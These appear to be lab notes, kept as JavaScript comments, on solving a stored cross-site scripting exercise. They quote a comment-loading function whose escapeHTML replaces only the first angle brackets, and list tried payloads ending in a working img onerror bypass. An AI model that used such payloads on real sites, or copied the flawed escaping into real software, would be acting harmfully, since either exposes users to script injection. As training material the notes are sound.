/*
function loadComments(postCommentPath) {    //postCommentPath as parameter
    let xhr = new XMLHttpRequest();        //new XML HTTP request
    xhr.onreadystatechange = function() {       
        if (this.readyState == 4 && this.status == 200) {       //if successful request
            let comments = JSON.parse(this.responseText);     //store parsed JSON response as comments
            displayComments(comments);         //display the comments
        }
    };

    xhr.open("GET", postCommentPath + window.location.search); //GET request to
    xhr.send();                                                //path variable+URL query parameter



    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
*/
/*
[
    {
        "avatar":"",
        "website":"http://www.cream.wutang",
        "date":"2023-06-19T04:19:02.624121642Z",
        "body":"HAHA","author":"victim"
    },
    {
        "avatar":"",
        "website":"http://www.cream.wutang",
        "date":"2023-06-19T04:44:18.348720751Z",
        "body":"BURP",
        "author":"victim"
    }
]

we enter in comment field HTML tags but find out only the first occurence is 
getting encoded coz thats how replace works unless a regex is mentioned 
<h1>NOW</h1>   results in the page as <h1>NOW
<h1><h1>NOW</h1>    this successfully reuslts in HTML render

<h1><h1 onmouseover="alert(1)">HWLLO</h1>   //this dont solve the LAB
<h1><h1 onload="alert(1)">HWLLO</h1>        //this dont solve the LAB
<<img src=1 onerror="alert(1)"/>
<<img src="0" onerror="alert(1)">
<h1><img src=1 onerror="alert(1)"/>         //done
*/